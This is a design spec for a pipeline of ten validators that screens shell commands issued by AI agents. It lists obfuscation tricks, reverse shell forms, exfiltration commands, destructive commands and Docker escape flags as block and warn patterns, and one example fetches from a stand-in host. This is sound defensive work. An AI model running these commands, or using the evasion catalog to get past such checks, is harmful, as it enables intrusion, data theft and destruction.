# Bash Validation Pipeline — Design Spec

**Date:** 2026-04-05
**Status:** Draft
**Scope:** Replace monolithic `BashValidator` with a modular pipeline of 10 semantic validators

## Problem

The current `src/main/security/bash-validator.ts` is a single class with 23 blocked commands, 21 warning regex patterns, and 6 blocked regex patterns. It uses flat pattern matching with no semantic understanding of commands. This misses:

- Shell obfuscation (hex escapes, variable expansion, base64 encoding, quote insertion)
- Indirect execution (eval, xargs, find -exec, awk system(), interpreter one-liners)
- Mode-aware enforcement (no concept of read-only vs workspace-write)
- Intent classification (no distinction between a read command and a write command)
- Domain-specific risks (git force-push, Docker escape, reverse shells, package manager abuse)

Claw-code-parity's reference implementation demonstrates 6 semantic submodules with intent classification and mode-aware validation. We go further: 10 submodules with 225+ patterns, informed by Gemini consensus analysis, GTFOBins research, and CTF/security community evasion catalogs.

## Architecture

```
                    +---------------------------+
                    |  BashValidationPipeline    |  (replaces BashValidator)
                    |  - runs all submodules     |
                    |  - returns first Block     |
                    |  - collects all Warns      |
                    +-----------+---------------+
                                |
              +-----------------+-----------------+
              v                 v                  v
     +----------------+ +--------------+  +------------------+
     | CommandParser   | | IntentClass. |  | ValidationContext |
     | - tokenize      | | - 8 intents  |  | - mode            |
     | - detect pipes  | | - cmd lists  |  | - workspace path  |
     | - detect subst. | |              |  | - instance depth  |
     | - detect evasion| +--------------+  | - yolo mode       |
     +----------------+                    +------------------+
              |
    +---------+----------------------------------------------+
    |            10 Validator Submodules                       |
    +---------------------------------------------------------+
    | 1. EvasionDetector     (obfuscation/encoding)           |
    | 2. DestructiveValidator (rm -rf, mkfs, shred)           |
    | 3. ReadOnlyValidator   (write cmds in RO mode)          |
    | 4. ModeValidator       (workspace boundaries)           |
    | 5. GitValidator        (force push, reset, config)      |
    | 6. SedValidator        (sed -i, sed -e write, sed -n e) |
    | 7. NetworkValidator    (rev shells, exfil, tunnels)     |
    | 8. DockerValidator     (escape, privileged, mounts)     |
    | 9. PackageValidator    (npm/pip install, npx, -e flags) |
    |10. PathValidator       (traversal, symlinks, RC files)  |
    +---------------------------------------------------------+
```

### Pipeline execution order

1. **CommandParser** tokenizes the input and extracts: main command, arguments, pipes, redirects, compound operators (`;`, `&&`, `||`, `&`).
2. **EvasionDetector** runs FIRST on the raw command string. If obfuscation is detected, it flags immediately before semantic validators can be bypassed.
3. **IntentClassifier** classifies the (possibly multi-segment) command into intent categories.
4. Submodules 2-10 run in order. First `Block` result stops the pipeline. All `Warn` results are aggregated.
5. The pipeline returns a `BashValidationResult` that is backward-compatible with the existing interface.

### Why EvasionDetector runs first

The fundamental limitation of pattern-matching validators is that bash is Turing-complete. You cannot reliably determine what a command does by inspecting its text if that text uses variable expansion, hex escapes, base64 encoding, or other obfuscation. Rather than trying to "resolve" obfuscation (which is impossible in general), we detect its *presence* and flag it. An AI agent has no legitimate reason to use `$'\x72\x6d'` instead of `rm`.

## Types

```typescript
/** Permission mode derived from instance context */
type PermissionMode = 'read_only' | 'workspace_write' | 'prompt' | 'allow';

/** Command intent classification */
type CommandIntent =
  | 'read_only'
  | 'write'
  | 'destructive'
  | 'network'
  | 'process_management'
  | 'package_management'
  | 'system_admin'
  | 'unknown';

/** Result from a single submodule */
type SubmoduleResult =
  | { action: 'allow' }
  | { action: 'warn'; message: string; submodule: string }
  | { action: 'block'; reason: string; submodule: string };

/** Evasion flags detected by EvasionDetector */
interface EvasionFlags {
  hasVariableExpansion: boolean;
  hasCommandSubstitution: boolean;
  hasHexOctalEscape: boolean;
  hasBase64Decode: boolean;
  hasPipeToShell: boolean;
  hasEvalExec: boolean;
  hasWrapperCommand: boolean;
  hasStringSplitting: boolean;
  hasBraceExpansion: boolean;
  hasGlobAsCommand: boolean;
  hasIfsManipulation: boolean;
  hasQuoteInsertion: boolean;
  hasEmptySubstitution: boolean;
  hasArithmeticExpansion: boolean;
  hasTrapDebug: boolean;
  hasEnvInjection: boolean;
}

/** Context passed to all validators */
interface ValidationContext {
  /** Current permission mode for this instance */
  mode: PermissionMode;
  /** Absolute path to the instance's workspace root */
  workspacePath: string;
  /** Supervisor tree depth (0 = root/user-created instance) */
  instanceDepth: number;
  /** Whether YOLO mode is enabled for this instance */
  yoloMode: boolean;
  /** Instance ID for logging/audit */
  instanceId: string;
}

/** Parsed command structure from CommandParser */
interface ParsedCommand {
  /** Raw input string */
  raw: string;
  /** Individual command segments split by ;, &&, ||, & */
  segments: CommandSegment[];
}

interface CommandSegment {
  /** The main command (after stripping path, sudo, env wrappers) */
  mainCommand: string;
  /** Original text of this segment before parsing */
  rawSegment: string;
  /** Positional arguments */
  arguments: string[];
  /** Pipe targets (commands piped to) */
  pipes: string[];
  /** Redirect operators and targets */
  redirects: string[];
  /** Whether this segment is backgrounded (&) */
  backgrounded: boolean;
}

/** Full pipeline result — backward-compatible with existing BashValidationResult */
interface BashValidationResult {
  /** Whether the command is allowed to execute */
  valid: boolean;
  /** Overall risk level */
  risk: 'safe' | 'warning' | 'dangerous' | 'blocked';
  /** Human-readable summary */
  message?: string;
  /** The original command string */
  command: string;
  /** Classified intent of the command */
  intent: CommandIntent;
  /** Evasion techniques detected in the command */
  evasionFlags: EvasionFlags;
  /** Results from each submodule that returned non-allow */
  submoduleResults: SubmoduleResult[];
  /** Backward-compatible parsed details */
  details?: {
    mainCommand: string;
    arguments: string[];
    pipes: string[];
    redirects: string[];
    warnings: string[];
    blockedPatterns: string[];
  };
}

/** Interface that all validator submodules implement */
interface BashValidatorSubmodule {
  /** Submodule name for logging and result attribution */
  readonly name: string;
  /**
   * Validate a command in the given context.
   * Receives both the raw string and parsed structure.
   * EvasionDetector primarily uses raw; semantic validators use parsed.
   */
  validate(
    raw: string,
    parsed: ParsedCommand,
    context: ValidationContext,
  ): SubmoduleResult;
}
```

## Submodule 1: EvasionDetector

Detects command obfuscation and encoding techniques. Runs on the raw command string before semantic analysis.

### Detection categories

**Variable expansion in command position:**
- `$VAR`, `${VAR}`, `${!VAR}` (indirect reference)
- Default value expansion: `${@:-r}m`, `${x:-rm}`
- Uninitialized variable insertion: `c${u}at` where `$u` is empty
- `$@` inside words: `who$@ami`
- `$0` as shell: `echo cmd|$0`
- Action: **Warn** (single flag), **Block** if combined with pipe-to-shell or other evasion

**Command substitution:**
- `$(cmd)`, backtick cmd
- Nested: `$(echo $(whoami))`
- Inside arguments to benign commands
- Action: **Warn**

**Hex/octal/unicode escapes:**
- ANSI-C quoting: `$'\x72\x6d'`, `$'\162\155'`, `$'\u0063\u0061\u0074'`
- echo -e: `echo -e "\x63\x61\x74"`, `echo -e "\143\141\164"`
- printf: `printf '\x63\x61\x74'`, `printf '\143\141\164'`
- Action: **Block** (no legitimate use in AI agent context)

**Base64/encoding decode to execution:**
- `base64 -d | sh`, `base64 -d | bash`, `base64 --decode | eval`
- `openssl enc -base64 -d | bash`
- `xxd -r -p | bash`
- `rev | bash`
- `tr 'a-zA-Z' 'n-za-mN-ZA-M' | bash` (ROT13)
- `gzip -d | bash`
- Action: **Block**

**String splitting / quote insertion:**
- Quotes splitting command names: `w'h'o'am'i`, `c"a"t`, `c\at`
- Empty backticks: wh(backtick backtick)oami
- Empty substitution: `who$()ami`, `ca$()t`
- Extra path slashes: `/////bin/////cat`
- Action: **Warn** (single technique), **Block** (combined with other flags)

**Brace expansion in command position:**
- `{cat,/etc/passwd}`, `{ls,-la,/}`, `{wget,http://evil.com,-O,/tmp/x}`
- Action: **Warn**

**IFS manipulation:**
- `IFS=` followed by any assignment
- `${IFS}` used as separator: `cat${IFS}/etc/passwd`
- Action: **Warn**

**Indirect execution via eval/exec/source:**
- `eval "..."`, `exec "..."`, `source <file>`, `. <file>`
- `source <(echo "...")`, `source /dev/stdin <<< "..."`
- Action: **Warn**

**Pipe to shell:**
- `| sh`, `| bash`, `| zsh`, `| dash`, `| ash`, `| ksh` at end of pipeline
- `| $0`, `| $SHELL`
- Action: **Block** when combined with decode/encoding

**Wrapper commands (strip and re-validate inner command):**
- `env CMD`, `time CMD`, `nice CMD`, `ionice CMD`
- `timeout N CMD`, `stdbuf CMD`, `watch CMD`, `nohup CMD`
- `setsid CMD`, `script -c CMD`, `rlwrap CMD`
- Action: Strip wrapper, re-validate inner command through full pipeline

**awk/sed system execution:**
- `awk 'BEGIN{system(...)}'`, `awk '{system(...)}'`
- `sed -n '1e CMD'` (GNU sed execute flag)
- `sed -e 's/.*/w /path'` (sed write to file)
- Action: **Block**

**Arithmetic expansion abuse:**
- `a[$(cmd)]` — bash evaluates array indices as arithmetic allowing command substitution
- `$(($(cmd)))` — arithmetic with embedded substitution
- `typeset -i x; x='...'` — evaluated as arithmetic
- Action: **Warn**

**Environment variable injection:**
- `BASH_ENV=/path bash`, `ENV=/path sh`
- `PROMPT_COMMAND="cmd"`
- `VISUAL=/bin/bash`, `EDITOR=/bin/bash` (triggers on crontab -e, git commit, etc.)
- `NODE_OPTIONS="--require /path"`, `PYTHONPATH=/evil`, `LD_PRELOAD=/evil.so`
- `PATH=/evil:$PATH`
- Shellshock-style: `env x='() { :; }; CMD' bash`
- Action: **Block** (LD_PRELOAD, BASH_ENV, Shellshock), **Warn** (others)

**trap/DEBUG persistence:**
- `trap 'CMD' DEBUG` — runs before every subsequent command
- `trap 'CMD' EXIT` — runs on shell exit
- Action: **Block**

**Wildcard argument injection:**
- Filenames that look like arguments: `--checkpoint-action=exec=sh`
- Detection: warn when `*` is used with `tar`, `rsync`, `zip`, `chown`, `chmod`
- Action: **Warn**

**Multi-step script creation + execution (stateful):**
- Track `echo ... > *.sh` or `printf ... > *.sh` or `cat > *.sh`
- Flag if followed by `bash *.sh`, `sh *.sh`, `chmod +x *.sh && ./*.sh`, `source *.sh`
- Implementation: maintain a per-instance set of recently-created script paths
- Action: **Warn**

### Escalation rule

If a command triggers 3 or more distinct evasion flags simultaneously, escalate to **Block** regardless of individual flag severity. The reasoning: a legitimate AI agent command never needs multiple obfuscation techniques.

## Submodule 2: DestructiveValidator

Detects commands that cause irreversible damage. Runs in all modes.

### Block patterns

| Pattern | Description |
|---------|-------------|
| `rm -rf /` | All variations: `-fr`, `--no-preserve-root`, with whitespace variations |
| `rm -rf ~`, `rm -rf $HOME` | Home directory destruction |
| `rm /` | Direct rm of root |
| `mkfs`, `mkfs.*` | Filesystem creation (ext4, xfs, btrfs, etc.) |
| `dd if=... of=/dev/sd*` | Direct disk write (sda, hda, nvme, vda) |
| `dd if=... of=/dev/sda` | Boot overwrite |
| `shred`, `wipefs` | Always destructive |
| `> /dev/sd*`, `> /dev/nvme*` | Redirect to disk device |
| `> /boot/*` | Boot overwrite via redirect |
| Fork bombs | `:(){ :\|:& };:` and variations |
| `chmod +s /bin/bash` (or any shell) | SUID bit on shell binary |
| `chmod -R 777 /` | World-writable root |
| `chmod -R 000 /` | Remove all permissions |
| `truncate -s 0 /dev/*` | Device truncation |

### Warn patterns

| Pattern | Description |
|---------|-------------|
| `rm -rf *`, `rm -rf .` | Current directory destruction |
| `rm -rf ../*` | Parent directory destruction |
| `chmod -R 777` (not root) | Broad permission change |
| `chown -R` with system paths | System ownership change |

## Submodule 3: ReadOnlyValidator

Active only when `context.mode === 'read_only'`. Blocks any command that modifies state.

### Write commands (Block)

```
cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp, ln, install,
tee, truncate, shred, mkfifo, mknod, dd
```

### State-modifying commands (Block)

```
apt, apt-get, yum, dnf, pacman, brew, pip, pip3, npm, yarn, pnpm,
bun, cargo, gem, go, rustup, docker, systemctl, service, mount,
umount, kill, pkill, killall, reboot, shutdown, halt, poweroff,
useradd, userdel, usermod, groupadd, groupdel, crontab, at
```

### Write redirections (Block)

```
>, >>, >&
```

### Git handling

Git commands are allowed in read-only mode ONLY if the subcommand is in the safe list:

```
status, log, diff, show, branch (list only), tag (list only), stash list,
remote, fetch, ls-files, ls-tree, cat-file, rev-parse, describe,
shortlog, blame, bisect, reflog, config --get
```

All other git subcommands (commit, push, merge, rebase, checkout, add, reset, clean, pull) are blocked in read-only mode.

## Submodule 4: ModeValidator

Routes validation based on the current permission mode.

| Mode | Behavior |
|------|----------|
| `read_only` | Calls ReadOnlyValidator internally (ReadOnlyValidator is NOT a separate pipeline step — it is invoked by ModeValidator when mode is read_only) |
| `workspace_write` | Warns if write command targets paths outside workspace. System paths checked: `/etc/`, `/usr/`, `/var/`, `/boot/`, `/sys/`, `/proc/`, `/dev/`, `/sbin/`, `/lib/`, `/opt/` |
| `prompt` | Returns Allow (the PermissionManager handles prompting separately) |
| `allow` | Returns Allow |

YOLO mode override: if `context.yoloMode === true`, ModeValidator returns Allow for all commands. YOLO mode is the user's explicit opt-in to unrestricted execution.

Note: ReadOnlyValidator (submodule 3) exists as a standalone class for testability, but in the pipeline it is only invoked via ModeValidator (submodule 4). The pipeline runs: EvasionDetector → DestructiveValidator → ModeValidator (which internally calls ReadOnlyValidator when appropriate) → GitValidator → SedValidator → NetworkValidator → DockerValidator → PackageValidator → PathValidator.

## Submodule 5: GitValidator

Git-specific safety checks. Active in all modes.

### Block

| Pattern | Reason |
|---------|--------|
| `git push --force` / `git push -f` (to main/master) | Destroys remote history |
| `git filter-branch` | Irreversible history rewrite |
| `git reflog expire --expire=now` | Permanent reflog deletion |
| `git config core.pager "CMD"` where CMD contains shell metacharacters | Payload injection via pager |
| `git config alias.* "!CMD"` where CMD is dangerous | Shell alias injection |
| `git clone --config core.fsmonitor="!CMD"` | Clone-time code execution |

### Warn

| Pattern | Reason |
|---------|--------|
| `git push --force` (non-main branch) | Still destructive |
| `git push --force-with-lease` | Safer but still forceful |
| `git reset --hard` | Discards uncommitted changes |
| `git clean -fd`, `git clean -fdx` | Removes untracked files |
| `git checkout -- .`, `git restore .` | Discards all unstaged changes |
| `git rebase` (any form) | History modification |
| `git gc --prune=now` | Aggressive garbage collection |
| Writing to `.git/hooks/*` | Potential hook injection |

## Submodule 6: SedValidator

Sed-specific safety. Sed has several features that can write files or execute commands.

| Pattern | Mode | Action |
|---------|------|--------|
| `sed -i` (in-place editing) | read_only | Block |
| `sed -i` (targeting system paths) | workspace_write | Warn |
| `sed -e 's/.../w /path'` (w flag writes match to file) | Any | Block |
| `sed -n '1e CMD'` (GNU sed execute flag) | Any | Block |

## Submodule 7: NetworkValidator

Detects network exploitation: reverse shells, data exfiltration, tunneling.

### Block: Reverse shells

Detection patterns for all known reverse shell variants:

**Bash native:**
- `bash -i >& /dev/tcp/`
- `/dev/tcp/` or `/dev/udp/` in any redirect context
- `exec N<>/dev/tcp/`

**Netcat family:**
- `nc -e /bin/sh`, `nc -e /bin/bash`
- `ncat -e`, `ncat --sh-exec`
- `mkfifo` + `nc` pipe pattern

**Socat:**
- `socat exec:'bash'`, `socat exec:sh`
- `socat tcp-connect:` with exec

**OpenSSL:**
- `openssl s_client` combined with `| /bin/sh` or `| bash`
- mkfifo + openssl s_client pipe pattern

**Telnet:**
- `telnet ADDR PORT | /bin/sh | telnet`
- mkfifo + telnet pattern

**Interpreter reverse shells** (detected via patterns in `-c`/`-e` arguments):
- Python: `socket` + `dup2` + `subprocess` or `pty.spawn`
- Perl: `Socket` + `open(STDIN` or `exec "/bin/sh"`
- Ruby: `TCPSocket` + `exec` or `IO.popen`
- PHP: `fsockopen` + `exec` or `proc_open`
- Lua: `socket.tcp` + `os.execute`
- Node: `net.Socket` + `child_process`
- Awk: `/inet/tcp/`
- Java: `Runtime.exec` + `/dev/tcp`

### Warn: Data exfiltration

| Pattern | Description |
|---------|-------------|
| `curl -X POST -d @<file>`, `curl -F file=@` | HTTP POST with file data |
| `wget --post-file` | HTTP POST with file |
| `scp <local> <remote>:` | File copy to remote |
| `rsync` to remote destination | File sync to remote |
| `curl file:///etc/passwd` | Local file read via curl protocol |

### Warn: DNS exfiltration

| Pattern | Description |
|---------|-------------|
| `dig $(...)`, `nslookup $(...)` | Command substitution in DNS query |
| `ping $(...)` with substitution | ICMP with data in hostname |
| `host $(...)` | DNS lookup with embedded data |

### Block: Tunneling and proxy tools

| Pattern | Description |
|---------|-------------|
| `ngrok`, `localtunnel`, `bore` | Tunnel tools |
| `cloudflared tunnel` | Cloudflare tunnel |

### Warn: SSH tunneling

| Pattern | Description |
|---------|-------------|
| `ssh -R` | Reverse port forward |
| `ssh -L` | Local port forward |
| `ssh -D` | Dynamic/SOCKS proxy |

## Submodule 8: DockerValidator

Prevents container escape and privilege escalation via Docker/Podman.

### Block

| Pattern | Reason |
|---------|--------|
| `docker run --privileged` | Full host access |
| `docker run --cap-add=ALL` | All capabilities |
| `docker run --cap-add=SYS_ADMIN` | Cgroup escape possible |
| `docker run -v /:/host` | Host root mount |
| `docker run -v /etc/:/...` | Sensitive config mount |
| `docker run -v /var/run/docker.sock:/...` | Docker-in-Docker escape |
| `docker run -v ~/.ssh:/...` | SSH key theft |
| `nsenter` (any invocation) | Namespace escape |

### Warn

| Pattern | Reason |
|---------|--------|
| `docker run --pid=host` | Host PID namespace |
| `docker run --network=host` | Host network namespace |
| `docker exec -u root` | Root execution in container |
| `docker cp ... container:/` | File injection into container |

All patterns also match `podman` equivalents (same flags, different binary name).

## Submodule 9: PackageValidator

Validates package manager and interpreter commands.

### Warn

| Pattern | Reason |
|---------|--------|
| `npm install <pkg>` where `<pkg>` is a named package (not `.`, not a path, not a git URL) | Arbitrary package install — may have postinstall scripts |
| `npm install --global`, `npm install -g` | Global install |
| `pip install <pkg>` where `<pkg>` is a named package (not `-r requirements.txt`, not `.`) | Arbitrary package install — may run setup.py |
| `yarn add`, `pnpm add` (unknown) | Unknown package |
| `npx <arbitrary>` | Arbitrary package execution |
| `make`, `gradle`, `mvn` | Build tool (can run arbitrary targets) |
| `npm publish`, `pip upload` | Package publication |
| `cargo install` (unknown) | Unknown Rust package |

### Block

| Pattern | Reason |
|---------|--------|
| `pip install --install-option` | Arbitrary install hooks |
| `curl ... \| pip install` | Piped remote install |
| `wget ... && pip install` | Downloaded remote install |

### Interpreter one-liners (delegate to EvasionDetector)

When the main command is `node`, `python`, `python3`, `perl`, `ruby`, `php`, `lua`, `tclsh`, `wish`:
- Extract the `-e`, `-c`, or `-r` argument content
- Run it through EvasionDetector for dangerous patterns (system(), exec, spawn, socket+dup2)
- Detection keywords: `system(`, `exec(`, `spawn(`, `child_process`, `subprocess`, `os.system`, `socket`, `dup2`, `pty.spawn`, `fsockopen`, `proc_open`, `popen`

## Submodule 10: PathValidator

Detects workspace boundary violations and writes to sensitive locations.

### Block

| Pattern | Reason |
|---------|--------|
| `ln -s / <workspace>` | Symlink root into workspace |
| `ln -s /etc <workspace>` | Symlink system config into workspace |
| `mount --bind / <anywhere>` | Bind mount root |
| Write to `~/.bashrc`, `~/.zshrc`, `~/.profile`, `~/.bash_profile` | RC file persistence |
| Write to `~/.ssh/authorized_keys` | SSH key injection |

### Warn

| Pattern | Reason |
|---------|--------|
| `../` traversal that resolves outside workspace | Escaping workspace boundary |
| `~/` or `$HOME` references in write context | Writing outside workspace |
| Absolute paths to `~/.ssh/`, `~/.gnupg/`, `~/.aws/`, `~/.kube/` | Sensitive directory access |
| `tar -xf` (any archive extraction) | Potential zip-slip in archive contents |
| Write to `/tmp` | Potential staging area for attacks |
| Read from `/proc/self/environ`, `/proc/*/cmdline` | Process info leaking |
| `/proc/self/exe` execution | Self-execution via proc |
| Extra slashes in paths (`/////bin/////cat`) | Path normalization evasion |

### Path normalization

Before checking paths, PathValidator normalizes:
1. Collapse multiple slashes: `//etc///passwd` -> `/etc/passwd`
2. Resolve `.` and `..` segments
3. Expand `~` to workspace context (not actual $HOME)
4. Flag but do not resolve symlinks (symlink resolution requires filesystem access)

## Integration

### Drop-in replacement

The `BashValidationPipeline` class replaces `BashValidator` with the same public API:

```typescript
// Old
import { getBashValidator } from '../security/bash-validator';
const result = getBashValidator().validate(command);

// New
import { getBashValidationPipeline } from '../security/bash-validation';
const result = getBashValidationPipeline().validate(command);
// OR with context:
const result = getBashValidationPipeline().validate(command, context);
```

The return type `BashValidationResult` is a superset of the old type. All existing fields (`valid`, `risk`, `message`, `command`, `details`) are preserved with identical semantics. New fields (`intent`, `evasionFlags`, `submoduleResults`) are additive.

### Singleton pattern

Follows the project convention:

```typescript
let pipeline: BashValidationPipeline | null = null;

export function getBashValidationPipeline(): BashValidationPipeline {
  if (!pipeline) {
    pipeline = new BashValidationPipeline();
  }
  return pipeline;
}

// For testing
export function _resetBashValidationPipelineForTesting(): void {
  pipeline = null;
}
```

### IPC handler update

`src/main/ipc/handlers/security-handlers.ts` line 257: swap `getBashValidator()` for `getBashValidationPipeline()`. The IPC payload schema (`BashValidatePayloadSchema`) does not change — the command string is the input, the enriched result is the output.

### Permission manager integration

The `PermissionManager`'s system rule "Deny Dangerous Bash" (line 380-390) currently uses a regex pattern. This can optionally delegate to the pipeline for deeper analysis. The existing regex rule can coexist with the pipeline — both layers provide defense in depth.

### Backward compatibility with existing tests

The 19 existing tests in `harness-invariants.spec.ts` (lines 85-208) must all pass with identical results:
- All blocked commands remain blocked (mkfs, fdisk, dd, shutdown, reboot, useradd, nmap, nc, xmrig, rm -rf /, fork bombs)
- All warning patterns remain warnings (recursive rm, curl|sh, sudo -i, PATH manipulation, LD_PRELOAD, history -c)
- All safe commands remain safe (ls, cat, grep, head, pwd, cd, which, whoami, uname, date)

A dedicated `backward-compat.spec.ts` test file will verify this mapping explicitly.

### Deprecated old module

The old `bash-validator.ts` file is preserved but deprecated. Its `BashValidator` class and `getBashValidator()` function are re-exported from the new pipeline module to avoid breaking any remaining direct imports. A deprecation JSDoc comment directs consumers to the new API.

## File structure

```
src/main/security/bash-validation/
  +-- index.ts                    (re-exports pipeline + types + getBashValidationPipeline)
  +-- types.ts                    (all types: BashValidationResult, SubmoduleResult, etc.)
  +-- command-parser.ts           (tokenizer, pipe/redirect/subshell/compound detection)
  +-- intent-classifier.ts        (8 intent categories with command lists)
  +-- pipeline.ts                 (BashValidationPipeline class)
  +-- validators/
  |   +-- evasion-detector.ts
  |   +-- destructive-validator.ts
  |   +-- read-only-validator.ts
  |   +-- mode-validator.ts
  |   +-- git-validator.ts
  |   +-- sed-validator.ts
  |   +-- network-validator.ts
  |   +-- docker-validator.ts
  |   +-- package-validator.ts
  |   +-- path-validator.ts
  +-- __tests__/
      +-- pipeline.spec.ts
      +-- evasion-detector.spec.ts
      +-- destructive-validator.spec.ts
      +-- read-only-validator.spec.ts
      +-- mode-validator.spec.ts
      +-- git-validator.spec.ts
      +-- sed-validator.spec.ts
      +-- network-validator.spec.ts
      +-- docker-validator.spec.ts
      +-- package-validator.spec.ts
      +-- path-validator.spec.ts
      +-- backward-compat.spec.ts
      +-- intent-classifier.spec.ts
      +-- command-parser.spec.ts
```

## Testing strategy

### Unit tests per submodule

Each validator gets its own test file with:
- Positive cases (correctly blocks/warns)
- Negative cases (correctly allows safe commands)
- Edge cases specific to that submodule
- Boundary conditions

### Integration tests

`pipeline.spec.ts` tests the full pipeline with:
- Multi-evasion escalation (3+ flags = block)
- Compound commands (each segment validated independently)
- Mode interaction (same command, different modes, different results)
- Wrapper stripping + re-validation
- Context propagation

### Backward compatibility tests

`backward-compat.spec.ts` imports the new pipeline and runs every test case from the existing `harness-invariants.spec.ts` to verify identical risk levels.

### Test counts estimate

- EvasionDetector: ~60 tests (largest submodule, most patterns)
- DestructiveValidator: ~20 tests
- ReadOnlyValidator: ~25 tests
- ModeValidator: ~15 tests
- GitValidator: ~15 tests
- SedValidator: ~8 tests
- NetworkValidator: ~25 tests (many reverse shell variants)
- DockerValidator: ~15 tests
- PackageValidator: ~15 tests
- PathValidator: ~20 tests
- Pipeline integration: ~20 tests
- Backward compat: ~19 tests (mirroring existing harness invariants)
- IntentClassifier: ~15 tests
- CommandParser: ~20 tests
- **Total: ~290 tests**

## Non-goals

- **Full AST parsing of bash**: We detect evasion signals, not resolve them. A full bash parser is a separate project.
- **Runtime monitoring**: This is static analysis of command text. Runtime monitoring (what the process actually does) is handled by the sandbox/container layer.
- **Allowlist mode**: While Gemini recommended default-deny, this would break too many workflows. We use enriched detection (default-allow for clean commands, default-block for obfuscated commands) as a pragmatic middle ground.
- **Cross-command statefulness**: The multi-step tracking (create script then execute) is limited to a per-instance recent-file set, not a full command history graph. Deep statefulness is future work.
